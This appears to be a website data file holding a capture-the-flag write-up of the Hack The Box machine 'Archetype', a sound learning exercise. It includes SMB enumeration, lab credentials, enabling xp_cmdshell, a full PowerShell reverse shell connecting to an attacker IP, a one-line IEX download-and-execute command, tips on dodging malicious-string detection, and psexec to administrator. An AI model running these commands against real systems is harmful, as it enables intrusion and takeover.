{
    "note":"title must match route name in App.js",
    "title":"Archetype",
    "path":"archetype",
    "tags":["easy","ctf", "box", "htb","smb","sql","powershell", "iex", "python webserver","curl","download file","powershell iex", "windows", "privesc","smbclient","crackmapexec","rce"],
    "date":"27/06/2023",
    "location": "./writeup/",
    "banner":"writeup/archetype/banner.gif",
    "type":"writeup",
    "search":[
        {
            "section":"",
            "description":"Scanning with Nmap, discovering ports 135 msrpc, 139 netbios-ssn, 445 microsoft-ds and 1433 ms-sql-s"
        },
        {
            "section":"Listing shares",
            "description":"Listing SMB shares with smbclient"
        },
        {
            "section":"Access share",
            "description":"Access SMB share with smbclient"
        },
        {
            "section":"Download file",
            "description":"Downloading files from SMB share"
        },
        {
            "section":"Access SQL",
            "description":"Accessing SQL with Impacket script mssqlclient"
        },
        {
            "section":"Remote Code Execution",
            "description":"Remote code execution (RCE) from SQL command line"
        },
        {
            "section":"Reverse shell",
            "description":"Downloading and executing a reverse shell with Powershell IEX"
        },
        {
            "section":"Reverse shell",
            "description":"Employed python web server to download file with powershell command in Windows environment."
        }
    ],
    "body":[
        {
            "id":"Archetype",
            "title":"<h1> <span style=\"color:#da1953\">Arc</span>hetype</h1><hr>",
            "body":[
                {
                    "id":"banner",
                    "title":"",
                    "body":[
                        "<img src=\"/cyber/writeup/archetype/banner.gif\" alt=\"\">"
                    ]
                },
                {
                    "id":"Scanning",
                    "title":"<hr><h1><span style=\"color:#da1953\">Sca</span>nning</h1>",
                    "body":[
                        "<br><pre># Nmap 7.80 scan initiated Fri Jun 18 02:52:56 2021 as: nmap -sC -sV -oA nmap/nmap 10.10.10.27<br>Nmap scan report for 10.10.10.27<br>Host is up (0.048s latency).<br>Not shown: 996 closed ports<br>PORT     STATE SERVICE      VERSION<br>135/tcp  open  msrpc        Microsoft Windows RPC<br>139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn<br>445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds<br>1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM<br>| ms-sql-ntlm-info: <br>|   Target_Name: ARCHETYPE<br>|   NetBIOS_Domain_Name: ARCHETYPE<br>|   NetBIOS_Computer_Name: ARCHETYPE<br>|   DNS_Domain_Name: Archetype<br>|   DNS_Computer_Name: Archetype<br>|_  Product_Version: 10.0.17763<br>| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback<br>| Not valid before: 2021-06-18T07:06:04<br>|_Not valid after:  2051-06-18T07:06:04<br>|_ssl-date: 2021-06-18T07:11:38+00:00; +18m24s from scanner time.<br>Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>|_clock-skew: mean: 1h42m23s, deviation: 3h07m50s, median: 18m23s<br>| ms-sql-info: <br>|   10.10.10.27:1433: <br>|     Version: <br>|       name: Microsoft SQL Server 2017 RTM<br>|       number: 14.00.1000.00<br>|       Product: Microsoft SQL Server 2017<br>|       Service pack level: RTM<br>|       Post-SP patches applied: false<br>|_    TCP port: 1433<br>| smb-os-discovery: <br>|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)<br>|   Computer name: Archetype<br>|   NetBIOS computer name: ARCHETYPE\\x00<br>|   Workgroup: WORKGROUP\\x00                                                                                        <br>|_  System time: 2021-06-18T00:11:29-07:00                                  <br>| smb-security-mode:                          <br>|   account_used: guest                                                                                             <br>|   authentication_level: user                                                                                      <br>|   challenge_response: supported                                                                                   <br>|_  message_signing: disabled (dangerous, but default)                                                              <br>| smb2-security-mode:                                                                                               <br>|   2.02:                                                                                                           <br>|_    Message signing enabled but not required<br>| smb2-time: <br>|   date: 2021-06-18T07:11:30<br>|_  start_date: N/A<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br># Nmap done at Fri Jun 18 02:53:14 2021 -- 1 IP address (1 host up) scanned in 18.46 seconds<br></pre><br>"
                    ] 
                },
                {
                    "id":"Listing shares",
                    "title":"<h1><span style=\"color:#da1953\">Lis</span>ting shares</h1>",
                    "body":[
                        "<p>There are various ways to list the shares that I have seen in the various IppSec videos but in this specific case, the following command is the only one that worked.</p>",
                        "<p><pre>$ smbclient -N -L \\\\10.10.10.27<br><br>        Sharename       Type      Comment<br>        ---------       ----      -------<br>        ADMIN$          Disk      Remote Admin<br>        backups         Disk      <br>        C$              Disk      Default share<br>        IPC$            IPC       Remote IPC<br>SMB1 disabled -- no workgroup available<br></pre></p>",
                        "<p><i>smbclient<i> doesn't tell if a share is read-only or read/write. To get that information I use <i>crackmapexec<i>.</p>",
                        "<p><pre>$ crackmapexec smb 10.10.10.27 --shares -u 'benwick' -p ''<br>SMB         10.10.10.27     445    ARCHETYPE        [*] Windows Server 2019 Standard 17763 (name:ARCHETYPE) (domain:Archetype) (signing:False) (SMBv1:True)<br>SMB         10.10.10.27     445    ARCHETYPE        [+] Archetype\benwick: <br>SMB         10.10.10.27     445    ARCHETYPE        [+] Enumerated shares<br>SMB         10.10.10.27     445    ARCHETYPE        Share           Permissions     Remark<br>SMB         10.10.10.27     445    ARCHETYPE        -----           -----------     ------<br>SMB         10.10.10.27     445    ARCHETYPE        ADMIN$                          Remote Admin<br>SMB         10.10.10.27     445    ARCHETYPE        backups         READ            <br>SMB         10.10.10.27     445    ARCHETYPE        C$                              Default share<br>SMB         10.10.10.27     445    ARCHETYPE        IPC$                            Remote IPC<br></pre></p>",
                        "<p>With <i>crackmapexec</i> I have to specify a user and at least a blank password otherwise with the blank user for NULL authentication it doesn't work.</p>"
                    ]
                },
                {
                    "id":"Access share",
                    "title":"<h1><span style=\"color:#da1953\">Acc</span>ess share</h1>",
                    "body":[
                        "<p>From the previous step, the only share accessible for reading is <b>backups<b>.</p>",
                        "<p><pre>$ smbclient '\\10.10.10.27\backups'<br>Enter WORKGROUP\\kali's password: <br>Try \"help\" to get a list of possible commands.<br>smb: \\> ls<br>  .                                   D        0  Mon Jan 20 07:20:57 2020<br>  ..                                  D        0  Mon Jan 20 07:20:57 2020<br>  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020<br><br>                10328063 blocks of size 4096. 8258523 blocks available<br></pre></p>",
                        "<p>By listing the current directory you will find a configuration file.</p>"
                    ]
                },
                {
                    "id":"Download file",
                    "title":"<h1><span style=\"color:#da1953\">Dow</span>nload file</h1>",
                    "body":[
                        "<p>Since I couldn't read the configuration file I downloaded it to my host with the <code>get [remote-file-name] [local-file-name]</code> command.</p>",
                        "<p><pre>smb: \\> get prod.dtsConfig conf<br>getting file \\prod.dtsConfig of size 609 as conf (3.2 KiloBytes/sec) (average 3.2 KiloBytes/sec)<br></pre></p>"
                    ]
                },
                {
                    "id":"Credentials",
                    "title":"<h1><span style=\"color:#da1953\">Cre</span>dentials</h1>",
                    "body":[
                        "<p>Once the configuration file is open, I can see the credentials in it: <i>ARCHETYPE\\sql_svc:M3g4c0rp123</i>Since SQL appears on the user sunday most likely he is part of SQL account. In fact, from the Nmap scan, there is an <b>ms-sql-s<b> service on port 1322.</p>"
                    
                    ]
                },
                {
                    "id":"Access SQL",
                    "title":"<h1><span style=\"color:#da1953\">Acc</span>ess SQL</h1>",
                    "body":[
                        "<p>When it prompt for the password, enter the password found in the configuration file.</p>",
                        "<p><pre>$ python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py sql_svc@10.10.10.27 -windows-auth<br>Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation<br><br>Password:<br>[*] Encryption required, switching to TLS<br>[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master<br>[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english<br>[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192<br>[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.<br>[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.<br>[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) <br>[!] Press help for extra shell commands<br>SQL> <br></pre></p>"
                    ]
                },
                {
                    "id":"Current user permission",
                    "title":"<h1><span style=\"color:#da1953\">Cur</span>rent user permission</h1>",
                    "body":[
                        "<p>To check the permissions of the current user I execute the following query, if from 1 then it means that he has the permissions indicated otherwise not.</p>",
                        "<p><pre class=\"sql-code\"><span class=\"keyword\">SQL&gt;</span><br><span class=\"keyword\">select</span> <span class=\"function\">IS_SRVROLEMEMBER</span> ('sysadmin')<br><span class=\"output\">-----------</span><br><span class=\"number\">1</span></pre></p>"
                    ]
                },
                {
                    "id":"Remote Code Execution",
                    "title":"<h1><span style=\"color:#da1953\">Rem</span>ote Code Execution</h1>",
                    "body":[
                        "<p>I make an attempt to run some code with the xp_cmdshell function. I have to run the command <code>EXEC sp_configure 'Show Advanced Options', 1;</code> to configure <i>xp_cmdshell</i> and after each command, I have to issue <code>reconfigure;</code>. Instead, to enable it I have to run this other command <code>EXEC sp_configure 'xp_cmdshell', 1;</code> and obviously <code>reconfigure;</code>. And finally, I can execute the commands <code>xp_cmdshell <\"command\"></code>.</p>",
                        "<p><pre class=\"sql-code\"><span class=\"keyword\">EXEC</span> <span class=\"function\">sp_configure</span>(<span class=\"string\">'Show Advanced Options'</span>, <span class=\"number\">1</span>);<br><span class=\"comment\">[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.</span><br><span class=\"keyword\">reconfigure</span>;<br><span class=\"keyword\">EXEC</span> <span class=\"function\">sp_configure</span>(<span class=\"string\">'xp_cmdshell'</span>, <span class=\"number\">1</span>);<br><span class=\"comment\">[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.</span><br><span class=\"keyword\">reconfigure</span>;<br><span class=\"function\">xp_cmdshell</span> <span class=\"string\">\"whoami\"</span><br><span class=\"keyword\">output</span>                                                                             <br>--------------------------------------------------------------------------------   <br><span class=\"string\">archetype\\sql_svc</span>                                                 <br><span class=\"keyword\">NULL</span></pre></p>"
                    ]
                },
                {
                    "id":"Reverse shell",
                    "title":"<h1><span style=\"color:#da1953\">Rev</span>erse shell</h1>",
                    "body":[
                        "<p>For the reverse shell I have to use the one indicated on the official writeup as it checks for malicious pieces of Powershell code.</p>",
                        "<p><pre class=\"powershell-code\"><span class=\"variable\">$client</span> = <span class=\"cmdlet\">New-Object</span> <span class=\"type\">System.Net.Sockets.TCPClient</span>(\"10.10.14.84\", 4444);<br><span class=\"variable\">$stream</span> = <span class=\"variable\">$client</span>.<span class=\"method\">GetStream</span>();<br><span class=\"type\">[byte[]]</span><span class=\"variable\">$bytes</span> = 0..65535 | <span class=\"cmdlet\">%</span>{0};<br><span class=\"keyword\">while</span>(<span class=\"condition\">($i = $stream.Read($bytes, 0, $bytes.Length))</span> -ne 0) {<br>    <span class=\"variable\">$data</span> = (<span class=\"cmdlet\">New-Object</span> -<span class=\"parameter\">TypeName</span> <span class=\"type\">System.Text.ASCIIEncoding</span>).<span class=\"method\">GetString</span>($bytes, 0, $i);<br>    <span class=\"variable\">$sendback</span> = (<span class=\"cmdlet\">iex</span> <span class=\"variable\">$data</span> 2>&1 | <span class=\"cmdlet\">Out-String</span>);<br>    <span class=\"variable\">$sendback2</span> = <span class=\"variable\">$sendback</span> + \"# \";<br>    <span class=\"variable\">$sendbyte</span> = ([text.encoding]::ASCII).<span class=\"method\">GetBytes</span>(<span class=\"variable\">$sendback2</span>);<br>    <span class=\"variable\">$stream</span>.<span class=\"method\">Write</span>($sendbyte, 0, $sendbyte.Length);<br>    <span class=\"variable\">$stream</span>.<span class=\"method\">Flush</span>();<br>}<br><span class=\"variable\">$client</span>.<span class=\"method\">Close</span>();</pre></p>",
                        "<p>Copy and paste the code into a text file and save it with the <b>.ps1</b> extension.</p>",
                        {
                            "id":"Note",
                            "title":"<hr><h2>Note</h2>",
                            "body":[
                                "If you try another reverse shell and it doesn't work most likely some of the code is identified as a malicious one and should be adjusted appropriately. For example In the code above <code>PS\" + (pwd).Path + \"></code> has been replaced with `#` because it is identified as a malicious string, moreover, that string is not in any way useful for the operation of the reverse shell but only serves to give a friendlier prompt to the user. This issue was thiscussed in the following link at the time whe the box was active: <a href=\"https://forum.hackthebox.eu/discussion/3509/starting-point\">https://forum.hackthebox.eu/discussion/3509/starting-point</a>.<hr>"
                            ]
                        },
                        "<p>In order to download the reverse shell I have to start e web server, for simplicity in the same forder where i have my reverse shell.</p>",
                        "<p><div class=\"terminal\"><span class=\"prompt\">(kali@kali)~$</span> <span class=\"command\">python3 -m http.server 8800</span><br><span class=\"command\">Serving HTTP on 0.0.0.0 port 8800 (http://0.0.0.0:8800/) ...</span><br><span class=\"command\">10.10.10.27 - - [19/Jun/2021 06:24:20] \"GET /rev.ps1 HTTP/1.1\" 200 -</span><br></div></p>",
                        "<p>Before downloading and executing the reverse shell I have to listen to the set port with NetCat on another shell.</p>",
                        "<p></p>",
                        "<p>And finally to download and execute in one shot the reverse shell I use the following Powershell command on the SQL shell, the one where I used mssqlclient.py.</p>",
                        "<p><div class=\"terminal\"><span class=\"command\">xp_cmdshell </span><span class=\"quote\">\"</span><span class=\"keyword\">powershell</span><span class=\"quote\">\"</span> <span class=\"command\">IEX </span><span class=\"keyword\">(New-Object</span><span class=\"type\">Net.WebClient</span>)<span class=\"method\">.DownloadString</span><span class=\"quote\">\"</span>http://10.10.14.84:8800/rev.ps1<span class=\"quote\">\"</span>;</div></p>",
                        "<p>Once connected I obtained a shell where I can run Windows commands.</p>",
                        "<p><div class=\"terminal\"><span class=\"prompt\">(kali@kali)</span><span class=\"path\">~/htb/archetype$</span><span class=\"command\">nc </span>-lvp</span> 4444 listening on [any] 4444 ...<br/>10.10.10.27: inverse host lookup failed: Unknown host<br/>connect to [10.10.14.84] from (UNKNOWN) [10.10.10.27] 49681<br>#</div></p>"

                    ]
                },
                {
                    "id":"User flag",
                    "title":"<h1><span style=\"color:#da1953\">Use</span>r flag</h1>",
                    "body":[
                        "<p>As this is a normal user account as well as a service account, it is worth checking for frequently access files or executed commands. We can use the command below to accessed the PowerShell history file.</p>",
                        "<p><pre># type C:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt<br>net.exe use T: \\\\Archetype\\backups /user:administrator MEGACORP_4dm1n!!</pre></p>",
                        "<p>So the credentials for the share backups are: <i>administrator:MEGACORP_4dm1n!!</i>.</p>",
                        "<p><pre class=\"terminal\"><span class=\"prompt\">(kali@kali)</span><span class=\"path\">~/htb/archetype$</span><br><span class=\"command\">python3</span>/usr/share/doc/python3-impacket/examples/psexec.py administrator@10.10.10.27<br>Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation<br><br>Password:<br>[*] Requesting shares on 10.10.10.27.....<br>[*] Found writable share ADMIN$<br>[*] Uploading file ehFXfEZp.exe<br>[*] Opening SVCManager on 10.10.10.27.....<br>[*] Creating service FpdE on 10.10.10.27.....<br>[*] Starting service FpdE.....<br>[!] Press help for extra shell commands<br>Microsoft Windows [Version 10.0.17763.107]<br>(c) 2018 Microsoft Corporation. All rights reserved.<br><br>C:\\Windows\\system32><br></pre></p>"
                    ]
                },
                {
                    "id":"Root flag",
                    "title":"<h1><span style=\"color:#da1953\">Roo</span>t flag</h1>",
                    "body":[
                        "The root flag si in the Administrator's desktop.",
                        "<p><pre>Directory of C:\\Users\\Administrator\\Desktop<br><br>01/20/2020  06:42 AM    &lt;DIR&gt;          .<br>01/20/2020  06:42 AM    &lt;DIR&gt;          ..<br>02/25/2020  07:36 AM                32 root.txt<br>               1 File(s)             32 bytes<br>               2 Dir(s)  33,819,779,072 bytes free<br><br>C:\\Users\\Administrator\\Desktop>type root.txt<br>b91ccec3305e98240082d4474b848528<br></pre></p>"
                    ]
                }
            ]
        }
    ]
}
